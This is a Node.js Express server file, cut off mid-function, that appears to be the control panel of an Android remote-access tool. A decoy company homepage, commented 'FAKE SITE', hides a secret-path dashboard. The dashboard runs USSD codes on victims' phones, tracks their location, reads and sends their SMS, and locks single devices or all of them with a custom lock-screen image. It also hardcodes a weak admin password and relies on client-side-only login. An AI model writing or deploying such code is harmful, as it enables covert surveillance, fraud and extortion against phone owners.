// server.js – DEVICE LOCK/UNLOCK (FIXED)
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const SECRET_PATH = 'a9f3k217';
const ADMIN_USER = 'admin';
const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');

const failedAttempts = {};

function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || req.connection.remoteAddress;
}

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// DEVICE STATE
// ============================================================
let devices = {
    'device1': { name: 'Samsung S23', locked: false, battery: 85, online: true },
    'device2': { name: 'iPhone 15', locked: false, battery: 92, online: true },
    'device3': { name: 'Pixel 8', locked: true, battery: 67, online: false }
};
let lockScreenImage = null;

// ============================================================
// FAKE SITE
// ============================================================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Kigali Tech Solutions</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
                    min-height: 100vh;
                    background: #0a0e17;
                    color: #fff;
                    overflow-x: hidden;
                }
                .hero {
                    position: relative;
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    text-align: center;
                    padding: 40px 20px;
                    background: #0a0e17;
                }
                .hero-bg {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: 
                        linear-gradient(135deg, rgba(10,14,23,0.6) 0%, rgba(10,14,23,0.2) 100%),
                        url('https://raw.githubusercontent.com/Swordsman12-madax/admin_dashboard/main/public/images/kigali-convention-center.png') center/cover no-repeat;
                    z-index: 0;
                }
                .car-container {
                    position: absolute;
                    bottom: 5%;
                    width: 100%;
                    z-index: 1;
                    display: flex;
                    justify-content: space-around;
                    padding: 0 20px;
                    opacity: 0.25;
                }
                .car {
                    display: inline-block;
                    font-size: 48px;
                    filter: drop-shadow(0 0 20px rgba(79,195,247,0.1));
                    animation: floatCar 4s ease-in-out infinite;
                }
                .car:nth-child(2) { animation-delay: 0.5s; font-size: 56px; }
                .car:nth-child(3) { animation-delay: 1s; font-size: 42px; }
                .car:nth-child(4) { animation-delay: 1.5s; font-size: 52px; }
                @keyframes floatCar {
                    0%, 100% { transform: translateY(0); }
                    50% { transform: translateY(-8px); }
                }
                .hero-content {
                    position: relative;
                    z-index: 2;
                    max-width: 800px;
                }
                .hero-logo {
                    font-size: 72px;
                    margin-bottom: 10px;
                    display: block;
                }
                .hero-title {
                    font-size: 52px;
                    font-weight: 700;
                    background: linear-gradient(135deg, #4fc3f7 0%, #7c4dff 50%, #4fc3f7 100%);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    background-size: 200% 200%;
                    animation: gradientMove 4s ease-in-out infinite;
                    letter-spacing: -1px;
                }
                @keyframes gradientMove {
                    0%, 100% { background-position: 0% 50%; }
                    50% { background-position: 100% 50%; }
                }
                .hero-subtitle {
                    font-size: 20px;
                    color: #8896ab;
                    margin: 16px 0 8px;
                    font-weight: 300;
                    letter-spacing: 2px;
                }
                .hero-tagline {
                    font-size: 16px;
                    color: #4a5568;
                    margin-bottom: 30px;
                    font-weight: 300;
                }
                .hero-divider {
                    width: 80px;
                    height: 2px;
                    background: linear-gradient(90deg, #4fc3f7, #7c4dff);
                    margin: 20px auto 30px;
                    border: none;
                }
                .features {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
                    gap: 20px;
                    margin-top: 30px;
                }
                .feature-item {
                    background: rgba(17, 25, 39, 0.6);
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(79, 195, 247, 0.08);
                    border-radius: 12px;
                    padding: 16px 12px;
                    transition: all 0.3s ease;
                }
                .feature-item:hover {
                    border-color: rgba(79, 195, 247, 0.25);
                    transform: translateY(-2px);
                }
                .feature-item .icon {
                    font-size: 28px;
                    display: block;
                    margin-bottom: 6px;
                }
                .feature-item .label {
                    font-size: 12px;
                    color: #8896ab;
                    font-weight: 500;
                    letter-spacing: 0.5px;
                }
                .admin-gry-badge {
                    position: fixed;
                    bottom: 15px;
                    right: 15px;
                    font-size: 9px;
                    color: rgba(79,195,247,0.04);
                    font-family: 'Courier New', monospace;
                    letter-spacing: 3px;
                    user-select: none;
                    pointer-events: none;
                    z-index: 999;
                }
                @media (max-width: 768px) {
                    .hero-title { font-size: 32px; }
                    .hero-subtitle { font-size: 16px; }
                    .hero-logo { font-size: 48px; }
                    .car { font-size: 32px !important; }
                    .features { grid-template-columns: repeat(2, 1fr); }
                }
                @media (max-width: 480px) {
                    .hero-title { font-size: 24px; }
                    .hero-subtitle { font-size: 14px; }
                    .car-container { display: none; }
                }
            </style>
        </head>
        <body>
        <div class="admin-gry-badge">ADMIN GRY</div>
        <section class="hero">
            <div class="hero-bg"></div>
            <div class="car-container">
                <span class="car">🏎️</span>
                <span class="car">🏎️</span>
                <span class="car">🏎️</span>
                <span class="car">🏎️</span>
            </div>
            <div class="hero-content">
                <span class="hero-logo">🏎️</span>
                <h1 class="hero-title">Kigali Tech Solutions</h1>
                <p class="hero-subtitle">INNOVATING THE FUTURE OF RACING TECHNOLOGY</p>
                <div class="hero-divider"></div>
                <p class="hero-tagline">Luxury. Performance. Innovation.</p>
                <div class="features">
                    <div class="feature-item">
                        <span class="icon">⚡</span>
                        <span class="label">Electric Performance</span>
                    </div>
                    <div class="feature-item">
                        <span class="icon">🧠</span>
                        <span class="label">AI-Driven Tech</span>
                    </div>
                    <div class="feature-item">
                        <span class="icon">🔋</span>
                        <span class="label">Sustainable Energy</span>
                    </div>
                    <div class="feature-item">
                        <span class="icon">🌍</span>
                        <span class="label">Global Innovation</span>
                    </div>
                </div>
            </div>
        </section>
        </body>
        </html>
    `);
});

// ============================================================
// ADMIN DASHBOARD – with Device Lock/Unlock
// ============================================================
app.get('/a9f3k217', (req, res) => {
    let html = '';
    html += '<!DOCTYPE html>\n';
    html += '<html>\n';
    html += '<head>\n';
    html += '  <meta charset="UTF-8">\n';
    html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
    html += '  <title>Admin Dashboard</title>\n';
    html += '  <style>\n';
    html += '    * { margin: 0; padding: 0; box-sizing: border-box; }\n';
    html += '    body { font-family: "Segoe UI", -apple-system, sans-serif; background: #0a0e17; color: #e0e6ed; padding: 20px; min-height: 100vh; }\n';
    html += '    .container { max-width: 1100px; margin: 0 auto; }\n';
    html += '    .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #1a2332; margin-bottom: 30px; flex-wrap: wrap; gap: 10px; }\n';
    html += '    .header-left { display: flex; align-items: center; gap: 15px; }\n';
    html += '    .header-left h1 { font-size: 28px; color: #4fc3f7; font-weight: 700; letter-spacing: -0.5px; }\n';
    html += '    .admin-gry-badge { background: rgba(79,195,247,0.08); color: rgba(79,195,247,0.3); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 1.5px; border: 1px solid rgba(79,195,247,0.1); user-select: none; }\n';
    html += '    .logout-btn { color: #ff6b6b; cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.3s; background: none; border: none; }\n';
    html += '    .logout-btn:hover { opacity: 0.7; }\n';
    html += '    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; margin-bottom: 30px; }\n';
    html += '    .stat-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; }\n';
    html += '    .stat-card:hover { border-color: #4fc3f7; transform: translateY(-2px); }\n';
    html += '    .stat-card .value { font-size: 32px; font-weight: 700; color: #4fc3f7; line-height: 1.2; }\n';
    html += '    .stat-card .label { font-size: 13px; color: #8896ab; margin-top: 4px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }\n';
    html += '    .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }\n';
    html += '    .tool-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; transition: 0.3s; }\n';
    html += '    .tool-card:hover { border-color: #4fc3f7; }\n';
    html += '    .tool-card h4 { font-size: 16px; color: #e0e6ed; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }\n';
    html += '    .tool-card h4 .icon { font-size: 20px; }\n';
    html += '    .ussd-input-group { display: flex; gap: 8px; }\n';
    html += '    .ussd-input-group input { flex: 1; padding: 10px 14px; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; font-family: "Courier New", monospace; }\n';
    html += '    .ussd-input-group input:focus { outline: none; border-color: #4fc3f7; }\n';
    html += '    .ussd-input-group button { padding: 10px 20px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; transition: 0.3s; white-space: nowrap; }\n';
    html += '    .ussd-input-group button:hover { background: #3aa8dd; }\n';
    html += '    .ussd-response { margin-top: 10px; padding: 10px; background: #0a0e17; border-radius: 8px; border: 1px solid #1a2332; font-size: 13px; color: #8896ab; min-height: 50px; max-height: 120px; overflow-y: auto; font-family: "Courier New", monospace; word-wrap: break-word; }\n';
    html += '    .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }\n';
    html += '    .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }\n';
    html += '    .ussd-response.waiting { color: #ffd700; border-color: #ffd700; }\n';
    html += '    .location-info { display: flex; flex-direction: column; gap: 8px; }\n';
    html += '    .location-info .coord { color: #8896ab; font-size: 13px; }\n';
    html += '    .location-info .coord strong { color: #e0e6ed; }\n';
    html += '    .location-info .map-link { color: #4fc3f7; text-decoration: none; font-size: 13px; }\n';
    html += '    .location-info .map-link:hover { text-decoration: underline; }\n';
    html += '    .device-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px 16px; font-size: 13px; }\n';
    html += '    .device-info-grid .label { color: #8896ab; }\n';
    html += '    .device-info-grid .value { color: #e0e6ed; font-weight: 500; }\n';
    html += '    .section { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 24px; }\n';
    html += '    .section h3 { font-size: 18px; font-weight: 600; color: #e0e6ed; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }\n';
    html += '    .section h3 .badge-count { background: #1a2332; color: #8896ab; font-size: 12px; padding: 2px 10px; border-radius: 12px; }\n';
    html += '    .device-controls { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }\n';
    html += '    .device-controls button { padding: 6px 14px; border: none; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; transition: 0.3s; }\n';
    html += '    .device-controls button:hover { transform: scale(1.02); opacity: 0.9; }\n';
    html += '    .btn-lock { background: #ff6b6b; color: #0a0e17; }\n';
    html += '    .btn-unlock { background: #6bcb77; color: #0a0e17; }\n';
    html += '    .btn-lock-all { background: #ff4444; color: #fff; }\n';
    html += '    .btn-unlock-all { background: #44aa55; color: #fff; }\n';
    html += '    .device-card { background: #111927; border: 1px solid #1a2332; border-radius: 10px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; transition: 0.3s; }\n';
    html += '    .device-card:hover { border-color: #4fc3f7; }\n';
    html += '    .device-card .name { font-weight: 600; }\n';
    html += '    .device-card .status { font-size: 12px; padding: 2px 10px; border-radius: 12px; }\n';
    html += '    .device-card .status.locked { background: rgba(255,107,107,0.2); color: #ff6b6b; }\n';
    html += '    .device-card .status.unlocked { background: rgba(107,203,119,0.2); color: #6bcb77; }\n';
    html += '    table { width: 100%; border-collapse: collapse; font-size: 14px; }\n';
    html += '    th { text-align: left; color: #8896ab; padding: 10px 12px; border-bottom: 2px solid #1a2332; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }\n';
    html += '    td { padding: 10px 12px; border-bottom: 1px solid #0d1420; color: #c8d0dc; }\n';
    html += '    tr:hover td { background: rgba(79,195,247,0.02); }\n';
    html += '    .badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }\n';
    html += '    .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }\n';
    html += '    .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }\n';
    html += '    .badge.locked { background: rgba(255,107,107,0.15); color: #ff6b6b; }\n';
    html += '    .badge.unlocked { background: rgba(107,203,119,0.15); color: #6bcb77; }\n';
    html += '    .empty { text-align: center; padding: 30px 0; color: #4a5568; font-size: 14px; }\n';
    html += '    .empty .icon { font-size: 36px; margin-bottom: 8px; }\n';
    html += '    .login-container { max-width: 380px; margin: 100px auto; background: #111927; border: 1px solid #1a2332; border-radius: 16px; padding: 40px; text-align: center; }\n';
    html += '    .login-container .logo { font-size: 48px; margin-bottom: 8px; }\n';
    html += '    .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }\n';
    html += '    .login-container .sub { color: #8896ab; font-size: 14px; margin-bottom: 20px; }\n';
    html += '    .login-container input { width: 100%; padding: 12px 14px; margin: 8px 0; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; transition: 0.3s; }\n';
    html += '    .login-container input:focus { outline: none; border-color: #4fc3f7; box-shadow: 0 0 0 3px rgba(79,195,247,0.1); }\n';
    html += '    .login-container button { width: 100%; padding: 12px; margin-top: 12px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }\n';
    html += '    .login-container button:hover { background: #3aa8dd; transform: translateY(-1px); }\n';
    html += '    .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; min-height: 20px; }\n';
    html += '    .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }\n';
    html += '    .hidden { display: none; }\n';
    html += '    .file-upload-area { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin: 8px 0; }\n';
    html += '    .file-upload-area input[type="file"] { background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; padding: 8px; font-size: 13px; }\n';
    html += '    .file-upload-area button { padding: 8px 16px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; }\n';
    html += '    @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }\n';
    html += '  </style>\n';
    html += '</head>\n';
    html += '<body>\n';
    html += '<div class="container">\n';
    html += '  <div id="loginContainer" class="login-container">\n';
    html += '    <div class="logo">🔐</div>\n';
    html += '    <h3>Admin Access</h3>\n';
    html += '    <p class="sub">Enter your credentials</p>\n';
    html += '    <input type="text" id="loginUser" placeholder="Username">\n';
    html += '    <input type="password" id="loginPass" placeholder="Password">\n';
     html += '    <button onclick="login()">Login</button>\n';
    html += '    <div id="attemptsMsg" class="attempts-msg"></div>\n';
    html += '    <div id="loginError" class="error"></div>\n';
    html += '  </div>\n';
    html += '  <div id="dashboard" class="hidden">\n';
    html += '    <div class="header">\n';
    html += '      <div class="header-left">\n';
    html += '        <h1>📊 Admin Dashboard</h1>\n';
    html += '        <span class="admin-gry-badge">ADMIN GRY</span>\n';
    html += '      </div>\n';
    html += '      <button class="logout-btn" onclick="logout()">🚪 Logout</button>\n';
    html += '    </div>\n';
    html += '    <div class="stats" id="statsGrid">\n';
    html += '      <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Devices</div></div>\n';
    html += '      <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 Numbers</div></div>\n';
    html += '      <div class="stat-card"><div class="value" id="onlineCount">0</div><div class="label">🟢 Online</div></div>\n';
    html += '    </div>\n';
    html += '    <div class="tools-grid">\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📞</span> USSD Code</h4>\n';
    html += '        <div class="ussd-input-group">\n';
    html += '          <input type="text" id="ussdInput" placeholder="Enter USSD code (e.g., *123#)" value="">\n';
    html += '          <button onclick="executeUssd()">Execute</button>\n';
    html += '        </div>\n';
    html += '        <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>\n';
    html += '      </div>\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📍</span> Device Location</h4>\n';
    html += '        <div id="locationInfo" class="location-info">\n';
    html += '          <div class="coord"><strong>Latitude:</strong> <span id="latValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Longitude:</strong> <span id="lngValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Accuracy:</strong> <span id="accValue">--</span></div>\n';
    html += '          <div class="coord"><strong>Last Updated:</strong> <span id="locTime">--</span></div>\n';
    html += '          <a href="#" id="mapLink" class="map-link" target="_blank" style="display:none;">Open in Google Maps →</a>\n';
    html += '          <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>\n';
    html += '        </div>\n';
    html += '      </div>\n';
    html += '      <div class="tool-card">\n';
    html += '        <h4><span class="icon">📱</span> Device Info</h4>\n';
    html += '        <div id="deviceInfo" class="device-info-grid">\n';
    html += '          <span class="label">Model:</span><span class="value" id="diModel">--</span>\n';
    html += '          <span class="label">Manufacturer:</span><span class="value" id="diManufacturer">--</span>\n';
    html += '          <span class="label">Android Version:</span><span class="value" id="diAndroid">--</span>\n';
    html += '          <span class="label">Battery:</span><span class="value" id="diBattery">--</span>\n';
    html += '          <span class="label">Storage:</span><span class="value" id="diStorage">--</span>\n';
    html += '          <span class="label">Device ID:</span><span class="value" id="diDeviceId" style="font-size:11px;font-family:monospace;">--</span>\n';
    html += '        </div>\n';
    html += '        <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>\n';
    html += '      </div>\n';
    html += '    </div>\n';
    html += '    <!-- Device Control -->\n';
    html += '    <div class="section">\n';
    html += '      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">\n';
    html += '        <h3>🔒 Device Control</h3>\n';
    html += '        <div class="device-controls">\n';
    html += '          <button class="btn-lock" onclick="lockDevice(selectedDeviceId)">🔒 Lock Selected</button>\n';
    html += '          <button class="btn-unlock" onclick="unlockDevice(selectedDeviceId)">🔓 Unlock Selected</button>\n';
    html += '          <button class="btn-lock-all" onclick="lockAllDevices()">🔒 Lock All</button>\n';
    html += '          <button class="btn-unlock-all" onclick="unlockAllDevices()">🔓 Unlock All</button>\n';
    html += '        </div>\n';
    html += '      </div>\n';
    html += '      <div class="file-upload-area">\n';
    html += '        <span style="color:#8896ab;font-size:13px;">Lock Screen Image:</span>\n';
    html += '        <input type="file" id="lockImageInput" accept="image/*" onchange="previewLockImage(event)">\n';
    html += '        <button onclick="uploadLockImage()">Upload Image</button>\n';
    html += '        <span id="lockImageStatus" style="font-size:12px;color:#8896ab;"></span>\n';
    html += '      </div>\n';
    html += '      <div id="devicesLockList"><div class="empty"><div class="icon">🔒</div>Loading devices...</div></div>\n';
    html += '    </div>\n';
    html += '    <!-- SMS -->\n';
    html += '    <div class="section">\n';
    html += '      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:15px;">\n';
    html += '        <h3>💬 SMS Messages <span class="badge-count" id="smsCountBadge">0</span></h3>\n';
    html += '        <button class="logout-btn" style="background:#4fc3f7;color:#0a0e17;padding:6px 14px;border-radius:6px;font-size:12px;border:none;cursor:pointer;" onclick="refreshSms()">🔄 Refresh</button>\n';
    html += '      </div>\n';
    html += '      <div id="smsList"><div class="empty"><div class="icon">💬</div>No SMS messages yet</div></div>\n';
    html += '    </div>\n';
    html += '    <!-- Send SMS -->\n';
    html += '    <div class="section">\n';
    html += '      <h3>✉️ Send SMS</h3>\n';
    html += '      <div style="display:flex;gap:10px;flex-wrap:wrap;">\n';
    html += '        <input type="text" id="smsNumber" placeholder="Phone number" style="flex:2;min-width:150px;padding:10px 14px;background:#0a0e17;border:1px solid #1a2332;border-radius:8px;color:#e0e6ed;font-size:14px;">\n';
    html += '        <input type="text" id="smsMessage" placeholder="Message" style="flex:3;min-width:200px;padding:10px 14px;background:#0a0e17;border:1px solid #1a2332;border-radius:8px;color:#e0e6ed;font-size:14px;">\n';
    html += '        <button onclick="sendSms()" style="padding:10px 20px;background:#4fc3f7;border:none;border-radius:8px;color:#0a0e17;font-weight:600;cursor:pointer;white-space:nowrap;">Send</button>\n';
    html += '      </div>\n';
    html += '      <div id="smsSendResult" style="margin-top:8px;font-size:13px;color:#8896ab;"></div>\n';
    html += '    </div>\n';
    html += '    <!-- Connected Devices -->\n';
    html += '    <div class="section">\n';
    html += '      <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>\n';
    html += '      <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>\n';
    html += '    </div>\n';
    html += '    <!-- USSD Codes -->\n';
    html += '    <div class="section">\n';
    html += '      <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>\n';
    html += '      <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>\n';
    html += '    </div>\n';
    html += '  </div>\n';
    html += '</div>\n';
    html += '<script>\n';
    html += 'const API_BASE = "/a9f3k217";\n';
    html += 'let selectedDeviceId = null;\n';
    html += '\n';
    html += 'function selectDevice(id) {\n';
    html += '  selectedDeviceId = id;\n';
    html += '  document.querySelectorAll(".device-card").forEach(el => el.style.borderColor = "#1a2332");\n';
    html += '  const card = document.querySelector(`.device-card[data-id="${id}"]`);\n';
    html += '  if (card) card.style.borderColor = "#4fc3f7";\n';
    html += '}\n';
    html += '\n';
    html += 'async function login() {\n';
    html += '  const username = document.getElementById("loginUser").value;\n';
    html += '  const password = document.getElementById("loginPass").value;\n';
    html += '  const errorEl = document.getElementById("loginError");\n';
    html += '  const attemptsMsg = document.getElementById("attemptsMsg");\n';
    html += '  errorEl.style.display = "none";\n';
    html += '  attemptsMsg.textContent = "";\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/login", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ username, password })\n';
    html += '    });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) {\n';
    html += '      localStorage.setItem("adminLoggedIn", "true");\n';
    html += '      document.getElementById("loginContainer").style.display = "none";\n';
    html += '      document.getElementById("dashboard").classList.remove("hidden");\n';
    html += '      loadData();\n';
    html += '      refreshLocation();\n';
    html += '      refreshDeviceInfo();\n';
    html += '      refreshSms();\n';
    html += '      refreshDevicesLock();\n';
    html += '      document.getElementById("loginUser").value = "";\n';
    html += '      document.getElementById("loginPass").value = "";\n';
    html += '    } else {\n';
    html += '      document.getElementById("loginUser").value = "";\n';
    html += '      document.getElementById("loginPass").value = "";\n';
    html += '      if (data.remainingAttempts !== undefined) {\n';
    html += '        let left = data.remainingAttempts;\n';
    html += '        let msg;\n';
    html += '        if (left === 0) {\n';
    html += '          msg = "⚠️ You have been blocked for 12 hours. Try again later.";\n';
    html += '        } else {\n';
    html += '          msg = "⚠️ " + left + " attempt" + (left > 1 ? "s" : "") + " remaining before 12h block";\n';
    html += '        }\n';
    html += '        attemptsMsg.textContent = msg;\n';
    html += '      } else {\n';
    html += '        errorEl.textContent = data.error || "Invalid credentials";\n';
    html += '        errorEl.style.display = "block";\n';
    html += '      }\n';
    html += '    }\n';
    html += '  } catch (err) {\n';
    html += '    errorEl.textContent = "Connection error";\n';
    html += '    errorEl.style.display = "block";\n';
    html += '    console.error("Login error:", err);\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += 'function logout() {\n';
    html += '  localStorage.removeItem("adminLoggedIn");\n';
    html += '  document.getElementById("loginUser").value = "";\n';
    html += '  document.getElementById("loginPass").value = "";\n';
    html += '  document.getElementById("dashboard").classList.add("hidden");\n';
    html += '  document.getElementById("loginContainer").style.display = "block";\n';
    html += '  document.getElementById("attemptsMsg").textContent = "";\n';
    html += '  document.getElementById("loginError").style.display = "none";\n';
    html += '}\n';
    html += '\n';
    html += '// ============================================================\n';
    html += '// DEVICE LOCK/UNLOCK\n';
    html += '// ============================================================\n';
    html += 'async function refreshDevicesLock() {\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/devices-lock");\n';
    html += '    const data = await response.json();\n';
    html += '    renderDevicesLock(data);\n';
    html += '  } catch (error) {\n';
    html += '    console.error("Error loading devices:", error);\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += 'function renderDevicesLock(devices) {\n';
    html += '  const container = document.getElementById("devicesLockList");\n';
    html += '  if (!devices || Object.keys(devices).length === 0) {\n';
    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">🔒</div>No devices available</div>";\n';
    html += '    return;\n';
    html += '  }\n';
    html += '  let html = "<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Action</th></tr></thead><tbody>";\n';
    html += '  Object.keys(devices).forEach(id => {\n';
    html += '    const d = devices[id];\n';
    html += '    const isLocked = d.locked || false;\n';
    html += '    const onlineClass = d.online ? "online" : "offline";\n';
    html += '    const onlineText = d.online ? "🟢 Online" : "🔴 Offline";\n';
    html += '    const lockText = isLocked ? "🔒 Locked" : "🔓 Unlocked";\n';
    html += '    const lockClass = isLocked ? "locked" : "unlocked";\n';
    html += '    const actionBtn = isLocked \n';
    html += '      ? `<button class="btn-unlock" onclick="unlockDevice(\\\'' + id + '\\\')">Unlock</button>`\n';
    html += '      : `<button class="btn-lock" onclick="lockDevice(\\\'' + id + '\\\')">Lock</button>`;\n';
    html += '    html += `<tr class="device-card" data-id="${id}" onclick="selectDevice(\\\'' + id + '\\\')">`;\n';
    html += '    html += `<td><span class="name">${d.name || id}</span></td>`;\n';
    html += '    html += `<td><span class="badge ${lockClass}">${lockText}</span> <span class="badge ${onlineClass}">${onlineText}</span></td>`;\n';
    html += '    html += `<td>${d.battery || "--"}%</td>`;\n';
    html += '    html += `<td>${actionBtn}</td>`;\n';
    html += '    html += `</tr>`;\n';
    html += '  });\n';
    html += '  html += "</tbody></table>";\n';
    html += '  container.innerHTML = html;\n';
    html += '}\n';
    html += '\n';
    html += 'async function lockDevice(deviceId) {\n';
    html += '  if (!deviceId) { alert("Please select a device first"); return; }\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/lock-device", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ deviceId: deviceId, action: "lock" })\n';
    html += '    });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) { refreshDevicesLock(); }\n';
    html += '    else { alert("Failed to lock device: " + data.error); }\n';
    html += '  } catch { alert("Connection error"); }\n';
    html += '}\n';
    html += '\n';
    html += 'async function unlockDevice(deviceId) {\n';
    html += '  if (!deviceId) { alert("Please select a device first"); return; }\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/lock-device", {\n';
    html += '      method: "POST",\n';
    html += '      headers: { "Content-Type": "application/json" },\n';
    html += '      body: JSON.stringify({ deviceId: deviceId, action: "unlock" })\n';
    html += '    });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) { refreshDevicesLock(); }\n';
    html += '    else { alert("Failed to unlock device: " + data.error); }\n';
    html += '  } catch { alert("Connection error"); }\n';
    html += '}\n';
    html += '\n';
    html += 'async function lockAllDevices() {\n';
    html += '  if (!confirm("Lock ALL devices?")) return;\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/lock-all", { method: "POST" });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) { refreshDevicesLock(); }\n';
    html += '    else { alert("Failed: " + data.error); }\n';
    html += '  } catch { alert("Connection error"); }\n';
    html += '}\n';
    html += '\n';
    html += 'async function unlockAllDevices() {\n';
    html += '  if (!confirm("Unlock ALL devices?")) return;\n';
    html += '  try {\n';
    html += '    const response = await fetch(API_BASE + "/api/unlock-all", { method: "POST" });\n';
    html += '    const data = await response.json();\n';
    html += '    if (data.success) { refreshDevicesLock(); }\n';
    html += '    else { alert("Failed: " + data.error); }\n';
    html += '  } catch { alert("Connection error"); }\n';
    html += '}\n';
    html += '\n';
    html += '// ============================================================\n';
    html += '// LOCK SCREEN IMAGE UPLOAD\n';
    html += '// ============================================================\n';
    html += 'function previewLockImage(event) {\n';
    html += '  const file = event.target.files[0];\n';
    html += '  if (file) {\n';
    html += '    const reader = new FileReader();\n';
    html += '    reader.onload = function(e) {\n';
    html += '      document.getElementById("lockImageStatus").textContent = "📸 Image loaded: " + file.name;\n';
    html += '      document.getElementById("lockImageStatus").style.color = "#6bcb77";\n';
    html += '      window._lockImageData = e.target.result;\n';
    html += '    };\n';
    html += '    reader.readAsDataURL(file);\n';
    html += '  }\n';
    html += '}\n';
    html += '\n';
    html += 'async function uploadLockImage() {\n';
    html += '  const imageData = window._lockImageData;\n';
    html += '  if (!imageData) { alert("Please select an image first"); return; }\n';
    html += '  try {\n';
